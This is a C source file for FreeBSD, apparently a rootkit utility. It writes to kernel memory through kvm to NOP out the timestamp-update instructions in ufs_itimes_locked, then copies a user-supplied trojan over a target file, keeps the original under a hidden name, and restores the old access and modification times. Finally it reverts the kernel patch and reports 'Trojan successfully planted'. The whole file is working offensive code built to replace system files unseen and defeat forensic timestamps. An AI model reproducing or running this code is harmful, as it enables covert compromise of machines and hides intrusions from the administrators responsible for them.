#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <kvm.h>
#include <limits.h>
#include <nlist.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <utime.h>
#include "magick.h"

#define SIZE 450

/* Replacement code. */
unsigned char nop_code3[] =
"\x90\x90\x90";
unsigned char nop_code4[] =
"\x90\x90\x90\x90";
unsigned char nop_code5[] =
"\x90\x90\x90\x90\x90";

/**
 * Output of "llvm-objdump -dr /boot/kernel/kernel | less"
 * then search for "<ufs_itimes_locked>:"

ffffffff80f4bc50 ufs_itimes_locked:
ffffffff80f4bc50: 55                    pushq   %rbp
ffffffff80f4bc51: 48 89 e5              movq    %rsp, %rbp
ffffffff80f4bc54: 41 56                 pushq   %r14
ffffffff80f4bc56: 53                    pushq   %rbx
ffffffff80f4bc57: 48 83 ec 10           subq    $16, %rsp
ffffffff80f4bc5b: 48 89 fb              movq    %rdi, %rbx
ffffffff80f4bc5e: 4c 8b 77 10           movq    16(%rdi), %r14
ffffffff80f4bc62: 49 8b 46 18           movq    24(%r14), %rax
ffffffff80f4bc66: 4c 89 f7              movq    %r14, %rdi
ffffffff80f4bc69: ff 90 a8 01 00 00     callq   *424(%rax)
ffffffff80f4bc6f: 85 c0                 testl   %eax, %eax
ffffffff80f4bc71: 74 0e                 je      14 <ufs_itimes_locked+0x31>
ffffffff80f4bc73: 41 80 66 48 f8        andb    $-8, 72(%r14)
ffffffff80f4bc78: 48 83 c4 10           addq    $16, %rsp
ffffffff80f4bc7c: 5b                    popq    %rbx
ffffffff80f4bc7d: 41 5e                 popq    %r14
ffffffff80f4bc7f: 5d                    popq    %rbp
ffffffff80f4bc80: c3                    retq
ffffffff80f4bc81: 41 8b 46 48           movl    72(%r14), %eax
ffffffff80f4bc85: a8 07                 testb   $7, %al
ffffffff80f4bc87: 74 ef                 je      -17 <ufs_itimes_locked+0x28>
ffffffff80f4bc89: 8b 8b d8 01 00 00     movl    472(%rbx), %ecx
ffffffff80f4bc8f: 83 c1 fd              addl    $-3, %ecx
ffffffff80f4bc92: 48 8b 53 18           movq    24(%rbx), %rdx
ffffffff80f4bc96: 83 f9 01              cmpl    $1, %ecx
ffffffff80f4bc99: 77 13                 ja      19 <ufs_itimes_locked+0x5e>
ffffffff80f4bc9b: 48 b9 00 00 20 00 01 00 00 00 movabsq $4297064448, %rcx
ffffffff80f4bca5: 48 85 8a 80 00 00 00  testq   %rcx, 128(%rdx)
ffffffff80f4bcac: 74 1e                 je      30 <ufs_itimes_locked+0x7c>
ffffffff80f4bcae: b9 08 00 00 00        movl    $8, %ecx
ffffffff80f4bcb3: a8 06                 testb   $6, %al
ffffffff80f4bcb5: 75 1a                 jne     26 <ufs_itimes_locked+0x81>
ffffffff80f4bcb7: be 00 00 00 18        movl    $402653184, %esi
ffffffff80f4bcbc: 23 72 78              andl    120(%rdx), %esi
ffffffff80f4bcbf: 74 10                 je      16 <ufs_itimes_locked+0x81>
ffffffff80f4bcc1: b9 40 00 00 00        movl    $64, %ecx
ffffffff80f4bcc6: a8 01                 testb   $1, %al
ffffffff80f4bcc8: 75 07                 jne     7 <ufs_itimes_locked+0x81>
ffffffff80f4bcca: eb 0b                 jmp     11 <ufs_itimes_locked+0x87>
ffffffff80f4bccc: b9 20 00 00 00        movl    $32, %ecx
ffffffff80f4bcd1: 09 c8                 orl     %ecx, %eax
ffffffff80f4bcd3: 41 89 46 48           movl    %eax, 72(%r14)
ffffffff80f4bcd7: 48 8d 7d e0           leaq    -32(%rbp), %rdi
ffffffff80f4bcdb: e8 70 0f d6 ff        callq   -2748560 <vfs_timestamp>
ffffffff80f4bce0: 41 8b 4e 48           movl    72(%r14), %ecx
ffffffff80f4bce4: f6 c1 01              testb   $1, %cl
ffffffff80f4bce7: 74 3b                 je      59 <ufs_itimes_locked+0xd4>
ffffffff80f4bce9: 48 8b 45 e0           movq    -32(%rbp), %rax
ffffffff80f4bced: f7 c1 00 04 00 00     testl   $1024, %ecx
ffffffff80f4bcf3: 75 09                 jne     9 <ufs_itimes_locked+0xae>
ffffffff80f4bcf5: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f4bcf9: 89 41 10              movl    %eax, 16(%rcx)
ffffffff80f4bcfc: eb 08                 jmp     8 <ufs_itimes_locked+0xb6>
ffffffff80f4bcfe: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f4bd02: 48 89 41 20           movq    %rax, 32(%rcx)
ffffffff80f4bd06: 41 f6 46 49 04        testb   $4, 73(%r14)
ffffffff80f4bd0b: 8b 45 e8              movl    -24(%rbp), %eax
ffffffff80f4bd0e: 75 0a                 jne     10 <ufs_itimes_locked+0xca>
ffffffff80f4bd10: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f4bd14: 48 83 c1 14           addq    $20, %rcx
ffffffff80f4bd18: eb 08                 jmp     8 <ufs_itimes_locked+0xd2>
ffffffff80f4bd1a: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f4bd1e: 48 83 c1 44           addq    $68, %rcx
ffffffff80f4bd22: 89 01                 movl    %eax, (%rcx)
ffffffff80f4bd24: 41 8b 4e 48           movl    72(%r14), %ecx
ffffffff80f4bd28: f6 c1 04              testb   $4, %cl
ffffffff80f4bd2b: 74 37                 je      55 <ufs_itimes_locked+0x114>
ffffffff80f4bd2d: 48 8b 45 e0           movq    -32(%rbp), %rax
ffffffff80f4bd31: f7 c1 00 04 00 00     testl   $1024, %ecx
ffffffff80f4bd37: 75 09                 jne     9 <ufs_itimes_locked+0xf2>
ffffffff80f4bd39: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f4bd3d: 89 41 18              movl    %eax, 24(%rcx)
ffffffff80f4bd40: eb 08                 jmp     8 <ufs_itimes_locked+0xfa>
ffffffff80f4bd42: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f4bd46: 48 89 41 28           movq    %rax, 40(%rcx)
ffffffff80f4bd4a: 41 f6 46 49 04        testb   $4, 73(%r14)
ffffffff80f4bd4f: 8b 45 e8              movl    -24(%rbp), %eax
ffffffff80f4bd52: 75 09                 jne     9 <ufs_itimes_locked+0x10d>
ffffffff80f4bd54: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f4bd58: 89 41 1c              movl    %eax, 28(%rcx)
ffffffff80f4bd5b: eb 07                 jmp     7 <ufs_itimes_locked+0x114>
ffffffff80f4bd5d: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f4bd61: 89 41 40              movl    %eax, 64(%rcx)
ffffffff80f4bd64: 41 8b 4e 48           movl    72(%r14), %ecx
ffffffff80f4bd68: f6 c1 02              testb   $2, %cl
ffffffff80f4bd6b: 0f 84 02 ff ff ff     je      -254 <ufs_itimes_locked+0x23>
ffffffff80f4bd71: 48 8b 45 e0           movq    -32(%rbp), %rax
ffffffff80f4bd75: f7 c1 00 04 00 00     testl   $1024, %ecx
ffffffff80f4bd7b: 75 09                 jne     9 <ufs_itimes_locked+0x136>
ffffffff80f4bd7d: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f4bd81: 89 41 20              movl    %eax, 32(%rcx)
ffffffff80f4bd84: eb 08                 jmp     8 <ufs_itimes_locked+0x13e>
ffffffff80f4bd86: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f4bd8a: 48 89 41 30           movq    %rax, 48(%rcx)
ffffffff80f4bd8e: 41 f6 46 49 04        testb   $4, 73(%r14)
ffffffff80f4bd93: 8b 45 e8              movl    -24(%rbp), %eax
ffffffff80f4bd96: 75 1f                 jne     31 <ufs_itimes_locked+0x167>
ffffffff80f4bd98: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f4bd9c: 89 41 24              movl    %eax, 36(%rcx)
ffffffff80f4bd9f: 41 f6 46 49 04        testb   $4, 73(%r14)
ffffffff80f4bda4: 74 1f                 je      31 <ufs_itimes_locked+0x175>
ffffffff80f4bda6: 49 8b 46 38           movq    56(%r14), %rax
ffffffff80f4bdaa: 48 83 80 e8 00 00 00 01       addq    $1, 232(%rax)
ffffffff80f4bdb2: e9 bc fe ff ff        jmp     -324 <ufs_itimes_locked+0x23>
ffffffff80f4bdb7: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f4bdbb: 89 41 48              movl    %eax, 72(%rcx)
ffffffff80f4bdbe: 41 f6 46 49 04        testb   $4, 73(%r14)
ffffffff80f4bdc3: 75 e1                 jne     -31 <ufs_itimes_locked+0x156>
ffffffff80f4bdc5: 49 8b 46 38           movq    56(%r14), %rax
ffffffff80f4bdc9: 48 83 40 78 01        addq    $1, 120(%rax)
ffffffff80f4bdce: e9 a0 fe ff ff        jmp     -352 <ufs_itimes_locked+0x23>
ffffffff80f4bdd3: 66 2e 0f 1f 84 00 00 00 00 00 nopw    %cs:(%rax,%rax)
ffffffff80f4bddd: 0f 1f 00              nopl    (%rax)
*/
// Disable ufs_itimes change time code
// Record existing file's access, modification times
// Copy existing file to hidden file location
// Copy trojan file over existing file
// Set trojan file's access and modification times
// Restore ufs_itimes change time code
int main(int argc, char *argv[])
{
   int		   i, offset1, offset2, offset3, offset4, offset5, fd = -1;
   char		   errbuf[_POSIX2_LINE_MAX];
   kvm_t	  *kd;
   struct nlist	   nl[] = {{NULL}, {NULL},};
   unsigned char   ufs_itimes_code[SIZE];
   struct stat	   sb;
   struct utimbuf  time, file_time;
   char * trojan = NULL;
   char * destination = NULL;
   char * destination_dir = NULL;
   char * pos = NULL;
   size_t dest_dir_str_len = 0;
   int dest_is_file = 0;

   if (argc < 3) {
      printf("[-] Usage: %s [TROJAN FILE] [DESTINATION]\n", argv[0]);
      exit(0);
   }

   trojan = argv[1];
   destination = argv[2];

   if (stat(trojan, &sb) < 0) {
      fprintf(stderr, "[x] %s: STAT ERROR: %d\n", trojan, errno);
      exit(-1);
   } else if (!S_ISREG(sb.st_mode)) {
      printf("[x] %s is not a file\n", trojan);
      exit(-1);
   }

   if (stat(destination, &sb) < 0) {
      fprintf(stderr, "[x]  %s: STAT ERROR: %d\n", destination, errno);
      exit(-1);
   }

   // Determine if destination a file or directory
   if (S_ISDIR(sb.st_mode)) {
      destination_dir = destination;
   } else if (S_ISREG(sb.st_mode)) {
      dest_is_file = 1;
      file_time.actime = sb.st_atime;
      file_time.modtime = sb.st_mtime;
      // Find last '/' character in destination path
      if ((pos=strrchr(destination, '/')) == NULL) {
         printf("[x] No '/' character found in destination path: %s\n", destination);
         exit(-1);
      }

      dest_dir_str_len = pos - destination;
      printf("[-] Allocating %lu bytes for destination directory\n", dest_dir_str_len);
      destination_dir = malloc(dest_dir_str_len+1);
      bzero(destination_dir, dest_dir_str_len+1);
      strncpy(destination_dir, destination, dest_dir_str_len);
   } else {
      printf("[x] Destination %s is not a directory or file\n", destination);
      exit(-1);
   }

   if (dest_is_file) {
      printf("[-] Destination file is %s\n", destination);
   }

   printf("[-] Destination directory is %s\n", destination_dir);

   /* Initialize kernel virtual memory access. */
   kd = kvm_openfiles(NULL, NULL, NULL, O_RDWR, errbuf);
   if (kd == NULL) {
      fprintf(stderr, "[x] ERROR: %s\n", errbuf);
      exit(-1);
   }
   nl[0].n_name = "ufs_itimes_locked";
   if (kvm_nlist(kd, nl) < 0) {
      fprintf(stderr, "[x] ERROR: %s\n", kvm_geterr(kd));
      exit(-1);
   }
   if (!nl[0].n_value) {
      fprintf(stderr, "[x] ERROR: Symbol %s not found\n",
	      nl[0].n_name);
      exit(-1);
   }
   /* Save a copy of ufs_itimes. */
   if (kvm_read(kd, nl[0].n_value, ufs_itimes_code, SIZE) < 0) {
      fprintf(stderr, "[x] ERROR: %s\n", kvm_geterr(kd));
      exit(-1);
   }
   /*
    * Search through ufs_itimes_locked for the following three lines:
    *
    * DIP_SET(ip, i_ctime, ts.tv_sec);
    *
    * DIP_SET(ip, i_ctimensec, ts.tv_nsec);
    *
    * DIP_SET(ip, i_modrev, DIP(ip, i_modrev) + 1);
    *
    * We will NOP out the lines that write to memory.

ffffffff80f4bd81: 89 41 20              movl    %eax, 32(%rcx)
ffffffff80f4bd8a: 48 89 41 30           movq    %rax, 48(%rcx)
ffffffff80f4bd9c: 89 41 24              movl    %eax, 36(%rcx)
ffffffff80f4bdbb: 89 41 48              movl    %eax, 72(%rcx)
ffffffff80f4bdc9: 48 83 40 78 01        addq    $1, 120(%rax)
*/

   for (i = 0; i < SIZE - 4; i++) {
      if (ufs_itimes_code[i] == 0x89 &&
	  ufs_itimes_code[i + 1] == 0x41 &&
	  ufs_itimes_code[i + 2] == 0x20)
	 offset1 = i;
      if (ufs_itimes_code[i] == 0x48 &&
	  ufs_itimes_code[i + 1] == 0x89 &&
	  ufs_itimes_code[i + 2] == 0x41 &&
	  ufs_itimes_code[i + 3] == 0x30)
	 offset2 = i;
      if (ufs_itimes_code[i] == 0x89 &&
	  ufs_itimes_code[i + 1] == 0x41 &&
	  ufs_itimes_code[i + 2] == 0x24)
	 offset3 = i;
      if (ufs_itimes_code[i] == 0x89 &&
	  ufs_itimes_code[i + 1] == 0x41 &&
	  ufs_itimes_code[i + 2] == 0x48)
	 offset4 = i;
      if (ufs_itimes_code[i] == 0x48 &&
	  ufs_itimes_code[i + 1] == 0x83 &&
	  ufs_itimes_code[i + 2] == 0x40 &&
	  ufs_itimes_code[i + 3] == 0x78 &&
	  ufs_itimes_code[i + 4] == 0x01)
	 offset5 = i;
   }

   /* Save destination directory access and modification times. */
   if (stat(destination_dir, &sb) < 0) {
      fprintf(stderr, "[x] %s: STAT ERROR: %d\n", destination_dir, errno);
      exit(-1);
   }
   time.actime = sb.st_atime;
   time.modtime = sb.st_mtime;

   if (!dest_is_file) {
      file_time = time;
   }

   /* Patch ufs_itimes. */
   if (kvm_write(kd, nl[0].n_value + offset1, nop_code3,
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset1 at %d, ERROR: %s\n",
         offset1, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset2, nop_code4,
		 sizeof(nop_code4) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset2 at %d, ERROR: %s\n",
         offset2, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset3, nop_code3,
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset3 at %d, ERROR: %s\n",
         offset3, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset4, nop_code3,
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset4 at %d, ERROR: %s\n",
         offset4, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset5, nop_code5,
		 sizeof(nop_code5) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset5 at %d, ERROR: %s\n",
         offset5, kvm_geterr(kd));
      exit(-1);
   }

   // Copy existing file to hidden file location
   if (dest_is_file) {
      printf("[-] Copying existing file %s to %s.%s\n", destination,
         destination, T_NAME);
      char * copy_existing = malloc(3 + strlen(destination) + 1 +
         strlen(destination) + 1 + strlen(T_NAME));
      pos = copy_existing;
      strcpy(pos, "cp ");
      pos+=3;
      strcpy(pos, destination);
      pos+=strlen(destination);
      strcpy(pos, " ");
      pos++;
      strcpy(pos, destination);
      pos+=strlen(destination);
      strcpy(pos, ".");
      pos++;
      strcpy(pos, T_NAME);

      printf("[-] command = %s\n", copy_existing);
      if (system(copy_existing) < 0) {
         printf("[x] Failed to copy existing file %s to %s.%s\n", destination,
            destination, T_NAME);
      }

      free(copy_existing);
   }

   /* Copy trojan into DESTINATION. */
   char *string = malloc(3 + strlen(trojan) + 1 + strlen(destination));
   pos = string;
   strcpy(pos, "cp ");
   pos+=3;
   strcpy(pos, trojan);
   pos+=strlen(trojan);
   strcpy(pos, " ");
   pos++;
   strcpy(pos, destination);

   printf("[-] command = %s\n", string);
   if (system(string) < 0) {
      printf("[x] Failed to copy trojan file %s to %s\n", trojan, destination);
   }

   free(string);

   /* Roll back destination directory access and modification times. */
   if (utime(destination, &file_time) < 0) {
      fprintf(stderr, "[x] UTIME ERROR: %d\n", errno);
   }
   /* Restore ufs_itimes_locked. */
   if (utime(destination_dir, &time) < 0) {
      fprintf(stderr, "[x] UTIME ERROR: %d\n", errno);
   }
   /* Restore ufs_itimes_locked. */
   if (kvm_write(kd, nl[0].n_value + offset1, &ufs_itimes_code[offset1],
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset1 at %d, ERROR: %s\n",
         offset1, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset2, &ufs_itimes_code[offset2],
		 sizeof(nop_code4) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset2 at %d, ERROR: %s\n",
         offset2, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset3, &ufs_itimes_code[offset3],
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset3 at %d, ERROR: %s\n",
         offset3, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset4, &ufs_itimes_code[offset4],
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset4 at %d, ERROR: %s\n",
         offset4, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset5, &ufs_itimes_code[offset5],
		 sizeof(nop_code5) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset5 at %d, ERROR: %s\n",
         offset5, kvm_geterr(kd));
      exit(-1);
   }
   /* Close kd. */
   if (kvm_close(kd) < 0) {
      fprintf(stderr, "[x] ERROR: %s\n", kvm_geterr(kd));
      exit(-1);
   }

   printf("[-] Trojan successfully planted\n");
   exit(0);
}
